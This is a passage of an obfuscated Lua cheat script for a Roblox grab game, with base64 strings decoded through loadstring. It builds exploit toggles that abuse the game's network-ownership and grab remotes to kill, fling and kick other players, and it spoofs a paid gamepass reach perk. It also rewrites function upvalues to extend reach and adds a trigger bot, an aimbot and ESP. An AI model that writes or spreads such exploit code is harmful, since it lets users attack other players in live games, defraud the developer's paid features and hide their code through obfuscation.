				local SetNetOwner = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).GrabEvents.SetNetworkOwner
				local LocalPlayer = game.Players.LocalPlayer
				function invis_touch(part, cf)
					SetNetOwner:FireServer(part, cf)
				end
				function CheckAndYeet(toy)
					local part = toy:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
					if part then
						invis_touch(part, part.CFrame)
						if part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and part.PartOwner.Value == LocalPlayer.Name then
							part.CFrame = CFrame.new(0, 1000, 0)
						end
					end
				end
				while antiAntiKickActive do
					local target = selectedKickPlayer
					if target then
						local spawned = workspace:FindFirstChild(target.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
						if spawned then
							if spawned:FindFirstChild(loadstring(base64decode("TmluamFLdW5haQ=="))()) then
								CheckAndYeet(spawned.NinjaKunai)
							end
							if spawned:FindFirstChild(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))()) then
								CheckAndYeet(spawned.NinjaShuriken)
							end
							if spawned:FindFirstChild(loadstring(base64decode("QW50aUtpY2s="))()) then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild(loadstring(base64decode("VG9vbFBpY2theGU="))()) then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild(loadstring(base64decode("VG9vbFBlbmNpbA=="))()) then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild(loadstring(base64decode("VG9vbERpZ2dpbmdGb3JrUnVzdHk="))()) then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild(loadstring(base64decode("VG9vbENsZWF2ZXI="))()) then
								CheckAndYeet(spawned.AntiKick)
							end
						end
					end
					task.wait(0.1)
				end
			end)
		else
			antiAntiKickActive = false
		end
	end
})

local GrabGroup = Tabs.Grab:CreateBlock({Name = loadstring(base64decode("R3JhYiBDdXN0b21pemF0aW9u"))(), Side = loadstring(base64decode("TGVmdA=="))()})

_G.strength = 750
local strengthConnection
GrabGroup:CreateSlider({
	Name = loadstring(base64decode("UG93ZXI="))(),
        Flag = loadstring(base64decode("UG93ZXI="))(),
	Default = 750,
	Min = 1,
	Max = 20000,
	Rounding = 0,
	Callback = function(value)
		_G.strength = value
	end
})
GrabGroup:CreateToggle({
	Name = loadstring(base64decode("U3RyZW5ndGg="))(),
        Flag = loadstring(base64decode("U3RyZW5ndGg="))(),
	Default = false,
	Callback = function(enabled)
        SetToggleState(loadstring(base64decode("U3RyZW5ndGg="))(), Value)
		if enabled then
			strengthConnection = workspace.ChildAdded:Connect(function(model)
				if model.Name == loadstring(base64decode("R3JhYlBhcnRz"))() then
					local partToImpulse = model.GrabPart.WeldConstraint.Part1
					if partToImpulse then
						local velocityObj = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))(), partToImpulse)
						model:GetPropertyChangedSignal(loadstring(base64decode("UGFyZW50"))()):Connect(function()
							if not model.Parent then
								if UserInputService:GetLastInputType() == Enum.UserInputType.MouseButton2 then
									velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
									velocityObj.Velocity = workspace.CurrentCamera.CFrame.LookVector * _G.strength
									game:GetService(loadstring(base64decode("RGVicmlz"))()):AddItem(velocityObj, 1)
								else
									velocityObj:Destroy()
								end
							end
						end)
					end
				end
			end)
		elseif strengthConnection then
			strengthConnection:Disconnect()
		end
	end
})
local killGrabEnabled = false
local function killGrabFunction()
	workspace.ChildAdded:Connect(function(v)
		if v:IsA(loadstring(base64decode("TW9kZWw="))()) and v.Name == loadstring(base64decode("R3JhYlBhcnRz"))() and killGrabEnabled then
			task.wait(0.05)
			local grabPart = v:FindFirstChild(loadstring(base64decode("R3JhYlBhcnQ="))())
			if grabPart and grabPart:FindFirstChild(loadstring(base64decode("V2VsZENvbnN0cmFpbnQ="))()) then
				local part1 = grabPart.WeldConstraint.Part1
				if part1 and part1.Parent and part1.Parent ~= Player.Character then
					local targetChar = part1.Parent
					local targetHum = targetChar:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
					if targetHum and targetChar then
						pcall(function()
							targetHum.Health = 0
							targetChar:BreakJoints()
						end)
					end
				end
			end
		end
	end)
end

killGrabFunction()
GrabGroup:CreateToggle({
	Name = loadstring(base64decode("S2lsbCBHcmFi"))(),
        Flag = loadstring(base64decode("S2lsbCBHcmFi"))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("S2lsbCBHcmFi"))(), Value)
		killGrabEnabled = Value
	end
})

GrabGroup:CreateToggle({
        Name = loadstring(base64decode("S2ljayBHcmFi"))(),
        Default = false,
        Callback = function(state)
            if not state then
                getgenv().KickGrabActive = false
                getgenv().FKeyAttackActive = false
                if getgenv().FKeyInputConnection then
                    getgenv().FKeyInputConnection:Disconnect()
                    getgenv().FKeyInputConnection = nil
                end
                return
            end
            if getgenv().KickGrabActive then return end

            getgenv().KickGrabActive = true
            getgenv().FKeyAttackActive = false

            local GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
            local CreateGrabLine = GrabEvents:WaitForChild('CreateGrabLine')
            local SetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
            local DestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')

            task.spawn(function()
                while getgenv().KickGrabActive do
                    local grabParts = workspace:FindFirstChild('GrabParts')
                    if not grabParts then task.wait() continue end

                    local gp = grabParts:FindFirstChild('GrabPart')
                    local weld = gp and gp:FindFirstChildOfClass('WeldConstraint')
                    local part1 = weld and weld.Part1

                    if part1 then
                        local ownerPlayer = nil
                        for _, pl in ipairs(Players:GetPlayers()) do
                            if pl.Character and part1:IsDescendantOf(pl.Character) then
                                ownerPlayer = pl
                                break
                            end
                        end

                        if not ownerPlayer then task.wait() continue end

                        while getgenv().KickGrabActive and workspace:FindFirstChild('GrabParts') do
                            if ownerPlayer then
                                local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('HumanoidRootPart')
                                local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('Head')
                                local myTorso = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                                if tgtTorso and myTorso and tgtHead then
                                    pcall(function()
                                        SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                                    end)
                                    task.wait()
                                    pcall(function()
                                        DestroyGrabLine:FireServer(tgtHead)
                                    end)
                                end
                            end
                            task.wait()
                        end
                    end
                    task.wait()
                end
            end)

            function getScreenCenterTarget()
                local screenCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
                local ray = workspace.CurrentCamera:ViewportPointToRay(screenCenter.X, screenCenter.Y)
                local raycastParams = RaycastParams.new()
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                if LocalPlayer.Character then
                    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
                end

                local result = workspace:Raycast(ray.Origin, ray.Direction * 1000, raycastParams)
                if result and result.Instance then
                    for _, pl in ipairs(Players:GetPlayers()) do
                        if pl ~= LocalPlayer and pl.Character and result.Instance:IsDescendantOf(pl.Character) then
                            return pl
                        end
                    end
                end
                return nil
            end

            local fAttackTarget = nil
            local fAttackConnection = nil

            function stopFKeyAttack()
                getgenv().FKeyAttackActive = false
                fAttackTarget = nil
                if fAttackConnection then
                    fAttackConnection:Disconnect()
                    fAttackConnection = nil
                end
            end

            function startFKeyAttack(targetPlayer)
                getgenv().FKeyAttackActive = true
                fAttackTarget = targetPlayer
                fAttackConnection = RunService.RenderStepped:Connect(function()
                    if not getgenv().FKeyAttackActive or not fAttackTarget then
                        stopFKeyAttack()
                        return
                    end

                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
                    local tgtChar = fAttackTarget.Character
                    local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

                    if not myRoot or not tgtRoot then return end

                    local camCF = workspace.CurrentCamera.CFrame
                    local teleportPos = camCF.Position + camCF.LookVector * 20

                    pcall(function()
                        tgtRoot.CFrame = CFrame.new(teleportPos)
                    end)

                    local grabCFrame = CFrame.new(-9.0301513671875E-2, 0.4190945625305176, 0.4999980926513672, 0.39632707834243774, 0, -0.9181094169616699, -1.0944717132588266E-7, 1, -4.7245869438938826E-8, 0.9181094169616699, 5.9604644775390625e-8, 0.39632707834243774)

                    pcall(function()
                        CreateGrabLine:FireServer(tgtRoot, grabCFrame)
                        SetNetworkOwner:FireServer(tgtRoot, CFrame.lookAt(myRoot.Position, tgtRoot.Position))
                        DestroyGrabLine:FireServer(tgtRoot)
                    end)
                end)
            end

            getgenv().FKeyInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode ~= Enum.KeyCode.F then return end
                if getgenv().FKeyAttackActive then
                    stopFKeyAttack()
                    return
                end

                local target = getScreenCenterTarget()
                if not target then return end

                local myChar = LocalPlayer.Character
                local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
                local tgtChar = target.Character
                local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

                if not myRoot or not tgtRoot then return end

                local distance = (myRoot.Position - tgtRoot.Position).Magnitude
                if distance > 25 then return end

                startFKeyAttack(target)
            end)

            if game.PlaceId == 6961824067 then
                local G = ReplicatedStorage:WaitForChild('GrabEvents')
                G:WaitForChild('EndGrabEarly'):Destroy()
                Instance.new('RemoteEvent', G).Name = 'EndGrabEarly'
            end
        end
    })


GrabGroup:CreateToggle({
	Name = loadstring(base64decode("TWFzc0xlc3MgR3JhYg=="))(),
        Flag = loadstring(base64decode("TWFzc0xlc3MgR3JhYg=="))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("TWFzc0xlc3MgR3JhYg=="))(), Value)
		_G.MassLessGrab = Value
		if not _G.MassLessGrab then
			if _G.MLConn then
				_G.MLConn:Disconnect()
				_G.MLConn = nil
			end
			return
		end
		if _G.MLConn then
			_G.MLConn:Disconnect()
			_G.MLConn = nil
		end
		_G.MLSense = _G.MLSense or 200
		_G.MLConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
			if not _G.MassLessGrab then
				return
			end
			local gp = workspace:FindFirstChild(loadstring(base64decode("R3JhYlBhcnRz"))())
			if not gp then
				return
			end
			local dp = gp:FindFirstChild(loadstring(base64decode("RHJhZ1BhcnQ="))())
			if not dp then
				return
			end
			local ap = dp:FindFirstChild(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
			local ao = dp:FindFirstChild(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))())
			if ap then
				ap.Responsiveness = _G.MLSense
				ap.MaxForce = math.huge
				ap.MaxVelocity = math.huge
			end
			if ao then
				ao.Responsiveness = _G.MLSense
				ao.MaxTorque = math.huge
			end
		end)
	end
})


local PanelAssist = Tabs.Grab:CreateBlock({Name = loadstring(base64decode("R2FtZXBhc3M="))(), Side = loadstring(base64decode("TGVmdA=="))()})

do

    PanelAssist:CreateToggle({
        Name = loadstring(base64decode("RnJlZSBHYW1lcGFzcw=="))(),
        Tooltip = loadstring(base64decode("R2l2ZXMgeW91IDMwIHN0dWRzIG9mIHJlYWNoIGluc3RhbnRseQ=="))(),
        Default = false,
        Callback = function(state)
            if state then
                local Reach = Instance.new(loadstring(base64decode("Qm9vbFZhbHVl"))())
                Reach.Name = loadstring(base64decode("RmFydGhlclJlYWNo"))()
                Reach.Parent = game.Players.LocalPlayer
                Reach.Value = true

                local Notifier = game.ReplicatedStorage.GamepassEvents:FindFirstChild(loadstring(base64decode("RnVydGhlclJlYWNoQm91Z2h0Tm90aWZpZXI="))())
                if Notifier then
                    for _, connection in ipairs(getconnections(Notifier.OnClientEvent)) do
                        pcall(connection.Function)
                    end
                end
            else
                local Reach = game.Players.LocalPlayer:FindFirstChild(loadstring(base64decode("RmFydGhlclJlYWNo"))())
                if Reach then
                    Reach:Destroy()
                end
            end
        end
    })

    local GrabReachEnabled = false
    local GrabReachDist = 25

    function ApplyGrabReach(range)
        GrabReachDist = range
        pcall(function()
            local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
            local DataEvents = RS:FindFirstChild(loadstring(base64decode("RGF0YUV2ZW50cw=="))())
            if DataEvents then
                DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 195)),
                }))
            end
        end)
        pcall(function()
            local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
            local GamepassEvents = RS:FindFirstChild(loadstring(base64decode("R2FtZXBhc3NFdmVudHM="))())
            if GamepassEvents then
                local Notifier = GamepassEvents:FindFirstChild(loadstring(base64decode("RnVydGhlclJlYWNoQm91Z2h0Tm90aWZpZXI="))())
                if Notifier then
                    for _, conn in pairs(getconnections(Notifier.OnClientEvent)) do
                        for xVec0uwV in debug.getupvalues(conn.Function) do
                            debug.setupvalue(conn.Function, xVec0uwV, range)
                        end
                    end
                end
            end
        end)
    end

    PanelAssist:CreateToggle({
        Name = loadstring(base64decode("RnVydGhlciBSZWFjaA=="))(),
        Tooltip = loadstring(base64decode("RXh0ZW5kcyB5b3VyIGdyYWIgZGlzdGFuY2UgYmV5b25kIGRlZmF1bHQ="))(),
        Default = false,
        Callback = function(v)
            GrabReachEnabled = v
            if v then
                ApplyGrabReach(GrabReachDist)
            else
                ApplyGrabReach(25)
            end
        end
    })

    PanelAssist:CreateSlider({
        Name = loadstring(base64decode("UmVhY2ggRGlzdGFuY2U="))(),
        Default = 25,
        Min = 25,
        Max = 45,
        Callback = function(v)
            GrabReachDist = v
            if GrabReachEnabled then
                ApplyGrabReach(v)
            end
        end
    })
end

local TbotGroup = Tabs.Grab:CreateBlock({Name = loadstring(base64decode("VHJpZ2dlciBCb3Q="))(), Side = loadstring(base64decode("TGVmdA=="))()})
local AimGroup = Tabs.Grab:CreateBlock({Name = loadstring(base64decode("QWltYm90"))(), Side = loadstring(base64decode("UmlnaHQ="))()})

do

    local triggerEnabled = false
    local triggerDistance = 25
    local triggerDelay = 0.05

    local function getTargetsInRange()
        local targets = {}
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return targets end

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local tRoot = plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                local tHum = plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                if tRoot and tHum and tHum.Health > 0 then
                    local dist = (tRoot.Position - root.Position).Magnitude
                    if dist <= triggerDistance then
                        table.insert(targets, plr)
                    end
                end
            end
        end
        return targets
    end

    local function triggerBot()
        if not triggerEnabled then return end
        
        local targets = getTargetsInRange()
        if #targets == 0 then return end

        local cam = workspace.CurrentCamera
        local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
        local closestTarget = nil
        local closestDist = math.huge

        for _, plr in ipairs(targets) do
            local tRoot = plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if tRoot then
                local screenPos, onScreen = cam:WorldToViewportPoint(tRoot.Position)
                if onScreen then
                    local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
                    if screenDist < closestDist then
                        closestDist = screenDist
                        closestTarget = plr
                    end
                end
            end
        end

        if closestTarget then
            pcall(function()
                mouse1press()
                task.wait(0.05)
                mouse1release()
            end)
        end
    end

    TbotGroup:CreateToggle({
        Name = loadstring(base64decode("VHJpZ2dlciBCb3Q="))(),
        Default = false,
        Callback = function(v)
            triggerEnabled = v
            if v then
                task.spawn(function()
                    while triggerEnabled do
                        triggerBot()
                        task.wait(triggerDelay)
                    end
                end)
            end
        end
    })

    TbotGroup:CreateSlider({
        Name = loadstring(base64decode("VHJpZ2dlciBEaXN0YW5jZQ=="))(),
        Default = 25,
        Min = 5,
        Max = 50,
        Callback = function(v)
            triggerDistance = v
        end
    })

    TbotGroup:CreateSlider({
        Name = loadstring(base64decode("VHJpZ2dlciBEZWxheQ=="))(),
        Default = 0.05,
        Min = 0.01,
        Max = 0.5,
        Callback = function(v)
            triggerDelay = v
        end
    })
end

do

    local aimbotEnabled = false
    local aimbotDistance = 30
    local aimbotSmoothness = 0.5
    local aimbotFOV = 100
    local aimbotPart = loadstring(base64decode("SGVhZA=="))()
    local aimbotKey = Enum.KeyCode.Q

    local function getClosestTarget()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return nil end

        local cam = workspace.CurrentCamera
        local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
        local closestTarget = nil
        local closestScreenDist = math.huge

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local tPart = plr.Character:FindFirstChild(aimbotPart)
                local tHum = plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                if tPart and tHum and tHum.Health > 0 then
                    local dist = (tPart.Position - root.Position).Magnitude
                    if dist <= aimbotDistance then
                        local screenPos, onScreen = cam:WorldToViewportPoint(tPart.Position)
                        if onScreen then
                            local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
                            if screenDist <= aimbotFOV and screenDist < closestScreenDist then
                                closestScreenDist = screenDist
                                closestTarget = plr
                            end
                        end
                    end
                end
            end
        end
        return closestTarget
    end

    local function aimAtTarget(target)
        if not target or not target.Character then return end
        local tPart = target.Character:FindFirstChild(aimbotPart)
        if not tPart then return end
        
        local cam = workspace.CurrentCamera
        local currentCF = cam.CFrame
        local targetPos = tPart.Position
        
        local lookAtCF = CFrame.lookAt(currentCF.Position, targetPos)
        local newCF = currentCF:Lerp(lookAtCF, aimbotSmoothness)
        cam.CFrame = newCF
    end

    local function aimbotLoop()
        while aimbotEnabled do
            local target = getClosestTarget()
            if target then
                aimAtTarget(target)
            end
            task.wait()
        end
    end

    AimGroup:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIEFpbWJvdA=="))(),
        Default = false,
        Callback = function(v)
            aimbotEnabled = v
            if v then
                task.spawn(aimbotLoop)
            end
        end
    })

    AimGroup:CreateSlider({
        Name = loadstring(base64decode("QWltYm90IERpc3RhbmNl"))(),
        Default = 30,
        Min = 5,
        Max = 100,
        Callback = function(v)
            aimbotDistance = v
        end
    })

    AimGroup:CreateSlider({
        Name = loadstring(base64decode("QWltYm90IFNtb290aG5lc3M="))(),
        Default = 0.5,
        Min = 0.1,
        Max = 1,
        Callback = function(v)
            aimbotSmoothness = v
        end
    })

    AimGroup:CreateSlider({
        Name = loadstring(base64decode("QWltYm90IEZPVg=="))(),
        Default = 100,
        Min = 10,
        Max = 360,
        Callback = function(v)
            aimbotFOV = v
        end
    })

    AimGroup:CreateDropdown({
        Name = loadstring(base64decode("QWltIFBhcnQ="))(),
        Items = {loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(), loadstring(base64decode("VG9yc28="))()},
        Default = loadstring(base64decode("SGVhZA=="))(),
        Callback = function(v)
            aimbotPart = v
        end
    })
end



local VisL = Tabs.Player:CreateBlock({Name = loadstring(base64decode("VmlldyAmIE1vdmVtZW50"))(), Side = loadstring(base64decode("TGVmdA=="))()})
local VisualR = Tabs.Player:CreateBlock({Name = loadstring(base64decode("Tm90aWZ5"))(), Side = loadstring(base64decode("UmlnaHQ="))()})

KB_THRESHOLD = 10
BYTE_THRESHOLD = KB_THRESHOLD * 1024
COOLDOWN = 30
lastNotify = 0
connections = {}

function resolveSender(args)
    for _, v in ipairs(args) do
        if typeof(v) == loadstring(base64decode("SW5zdGFuY2U="))() and v:IsA(loadstring(base64decode("UGxheWVy"))()) then return v end
        if typeof(v) == loadstring(base64decode("SW5zdGFuY2U="))() and v:IsA(loadstring(base64decode("TW9kZWw="))()) then
            local plr = Players:GetPlayerFromCharacter(v)
            if plr then return plr end
        end
        if typeof(v) == loadstring(base64decode("SW5zdGFuY2U="))() and v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
            local model = v:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
            if model then
                local plr = Players:GetPlayerFromCharacter(model)
                if plr then return plr end
            end
        end
    end
    return LocalPlayer
end

function shortenString(str)
    if #str <= 80 then return str end
    return str:sub(1, 80) .. loadstring(base64decode("Li4uICgr"))() .. (#str - 80) .. loadstring(base64decode("IGNoYXJzKQ=="))()
end

function summarizeTable(136wpAnT)
    local preview = {}
    local count = 0
    for _, v in pairs(136wpAnT) do
        count = count + 1
        if count <= 5 then table.insert(preview, tostring(v)) end
    end
    return loadstring(base64decode("dGFibGVb"))()..count..loadstring(base64decode("XSB7IA=="))()..table.concat(preview, loadstring(base64decode("LCA="))())..loadstring(base64decode("IC4uLiB9"))()
end

 function compressArgs(args)
    local seen = {}
    local summary = {}
    for _, v in ipairs(args) do
        local key
        if typeof(v) == loadstring(base64decode("c3RyaW5n"))() then key = loadstring(base64decode("c3RyOg=="))()..shortenString(v)
        elseif typeof(v) == loadstring(base64decode("SW5zdGFuY2U="))() then key = loadstring(base64decode("aW5zdDo="))()..v.ClassName..loadstring(base64decode("KA=="))()..v.Name..loadstring(base64decode("KQ=="))()
        elseif typeof(v) == loadstring(base64decode("dGFibGU="))() then key = loadstring(base64decode("dGJsOg=="))()..summarizeTable(v)
        else key = typeof(v)..loadstring(base64decode("Og=="))()..tostring(v) end
        seen[key] = (seen[key] or 0) + 1
    end
    for sckTj49T, count in pairs(seen) do
        if count > 1 then table.insert(summary, sckTj49T..loadstring(base64decode("IHg="))()..count)
        else table.insert(summary, sckTj49T) end
    end
    return summary
end

 function handleEvent(eventType, remoteName, ...)
    local args = {...}
    local totalBytes = 0
    for _, v in ipairs(args) do
        if typeof(v) == loadstring(base64decode("c3RyaW5n"))() then totalBytes = totalBytes + #v end
    end
    if totalBytes < BYTE_THRESHOLD then return end
    if tick() - lastNotify < COOLDOWN then return end
    lastNotify = tick()
    local sender = resolveSender(args)
    local senderName = sender.DisplayName
    if sender == LocalPlayer then senderName = senderName .. loadstring(base64decode("IChZb3Up"))() end
    local mbSize = totalBytes / (1024 * 1024)
    local summarized = compressArgs(args)
   
    notify(string.format(loadstring(base64decode("WyVzXSAlcw=="))(), eventType, remoteName), string.format(loadstring(base64decode("UGxheWVyOiAlc1xuU2l6ZTogJS4zZiBNQlxuQXJnczpcbiVz"))(), senderName, mbSize, table.concat(summarized, loadstring(base64decode("XG4="))())), 7)
end

function scanForBlobRemotes(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA(loadstring(base64decode("UmVtb3RlRXZlbnQ="))()) and child.Name == loadstring(base64decode("UmVsYXlDbGllbnRBbmltYXRpb24="))() and child.Parent and child.Parent.Name == loadstring(base64decode("QmxvYm1hbkFuaW1hdGlvbnM="))() then
            table.insert(connections, child.OnClientEvent:Connect(function(...) handleEvent(loadstring(base64decode("QmxvYg=="))(), child.Parent.Parent.Name, ...) end))
        end
        scanForBlobRemotes(child)
    end
end

function watchChildren(parent)
    table.insert(connections, parent.ChildAdded:Connect(function(child)
        scanForBlobRemotes(child)
        watchChildren(child)
    end))
    for _, child in ipairs(parent:GetChildren()) do watchChildren(child) end
end

function startDetector()
    if #connections > 0 then return end
    local GrabRemoteDetect = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("RXh0ZW5kR3JhYkxpbmU="))())
    table.insert(connections, GrabRemoteDetect.OnClientEvent:Connect(function(...) handleEvent(loadstring(base64decode("R3JhYg=="))(), loadstring(base64decode("RXh0ZW5kR3JhYkxpbmU="))(), ...) end))
    scanForBlobRemotes(workspace)
    watchChildren(workspace)
end

function stopDetector()
    for _, conn in ipairs(connections) do conn:Disconnect() end
    connections = {}
end

    VisualR:CreateToggle({
        Name = loadstring(base64decode("UGFja2V0IE5vdGlmeQ=="))(),
        Flag = loadstring(base64decode("R3JhYlJlbW90ZURldGVjdG9y"))(),
        Default = false,
        Callback = function(Value)
        if Value then startDetector()
        else stopDetector() end
    end,
})

    -- Third Person
    do
        plr = game.Players.LocalPlayer
        VisL:CreateToggle({
            Name = loadstring(base64decode("VGhpcmQgUGVyc29u"))(),
            Default = false,
            Callback = function(Value)
                if Value then
                    plr.CameraMode = Enum.CameraMode.Classic
                    plr.CameraMaxZoomDistance = 1000
                    plr.CameraMinZoomDistance = 0.5
                else
                    plr.CameraMode = Enum.CameraMode.LockFirstPerson
                    plr.CameraMaxZoomDistance = 0.5
                    plr.CameraMinZoomDistance = 0.5
                end
            end
        })
    end

    -- FOV Slider
    VisL:CreateSlider({
        Name = loadstring(base64decode("RmllbGQgb2YgVmlldw=="))(),
        Min = 40,
        Max = 120,
        Default = 70,
        Callback = function(Value)
            local cam = workspace.CurrentCamera
            if cam then
                cam.FieldOfView = Value
            end
        end
    })

    -- Player ESP
    do
        espEnabled = false
        espColor = Color3.fromRGB(0, 255, 255)
        rainbowEnabled = false
        espConnections = {}
        espObjects = {}
        
        function createESP(player)
            if not player or not player.Character then return end
            
            local char = player.Character
            local hrp = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not hrp then return end
            
            local highlight = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))())
            highlight.Name = loadstring(base64decode("RVNQX0hpZ2hsaWdodA=="))()
            highlight.Adornee = char
            highlight.FillColor = espColor
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.4
            highlight.OutlineTransparency = 0
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.Parent = char
            
            local billboard = Instance.new(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            billboard.Name = loadstring(base64decode("RVNQX05hbWU="))()
            billboard.Adornee = hrp
            billboard.Size = UDim2.new(0, 200, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = hrp
            
            local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = player.DisplayName .. loadstring(base64decode("ICg="))() .. player.Name .. loadstring(base64decode("KQ=="))()
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextStrokeTransparency = 0
            label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            label.Font = Enum.Font.GothamBold
            label.TextScaled = true
            label.Parent = billboard
            
            local distBillboard = Instance.new(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            distBillboard.Name = loadstring(base64decode("RVNQX0Rpc3RhbmNl"))()
            distBillboard.Adornee = hrp
            distBillboard.Size = UDim2.new(0, 100, 0, 20)
            distBillboard.StudsOffset = Vector3.new(0, -2, 0)
            distBillboard.AlwaysOnTop = true
            distBillboard.Parent = hrp
            
            local distLabel = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
            distLabel.Size = UDim2.new(1, 0, 1, 0)
            distLabel.BackgroundTransparency = 1
            distLabel.Text = loadstring(base64decode("MCBzdHVkcw=="))()
            distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            distLabel.TextStrokeTransparency = 0
            distLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            distLabel.Font = Enum.Font.GothamBold
            distLabel.TextScaled = true
            distLabel.Parent = distBillboard
            
            table.insert(espObjects, {
                player = player,
                highlight = highlight,
                billboard = billboard,
                distBillboard = distBillboard,
                label = label,
                distLabel = distLabel
            })
            
            local conn = RunService.RenderStepped:Connect(function()
                if not espEnabled or not player.Character then
                    conn:Disconnect()
                    return
                end
                
                local localChar = LocalPlayer.Character
                local localHrp = localChar and localChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if localHrp and hrp and hrp.Parent then
                    local dist = math.floor((hrp.Position - localHrp.Position).Magnitude)
                    distLabel.Text = dist .. loadstring(base64decode("IHN0dWRz"))()
                end
            end)
            table.insert(espConnections, conn)
        end
        
        function clearESP()
            for _, conn in ipairs(espConnections) do
                pcall(function() conn:Disconnect() end)
            end
            espConnections = {}
            
            for _, obj in ipairs(espObjects) do
                pcall(function()
                    if obj.highlight then obj.highlight:Destroy() end
                    if obj.billboard then obj.billboard:Destroy() end
                    if obj.distBillboard then obj.distBillboard:Destroy() end
                end)
            end
            espObjects = {}
        end
        
        function updateAllESP()
            clearESP()
            if not espEnabled then return end
            
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character then
                    createESP(plr)
                end
            end
        end
        
        function updateColors()
            for _, obj in ipairs(espObjects) do
                pcall(function()
                    if obj.highlight then
                        obj.highlight.FillColor = espColor
                    end
                end)
            end
        end
        
        VisL:CreateToggle({
            Name = loadstring(base64decode("UmFpbmJvdyBFU1A="))(),
            Default = false,
            Callback = function(Value)
                rainbowEnabled = Value
                if Value then
                    task.spawn(function()
                        while rainbowEnabled and espEnabled do
                            local hue = tick() % 1
                            espColor = Color3.fromHSV(hue, 1, 1)
                            updateColors()
                            task.wait(0.05)
                        end
                    end)
                else
                    espColor = Color3.fromRGB(0, 255, 255)
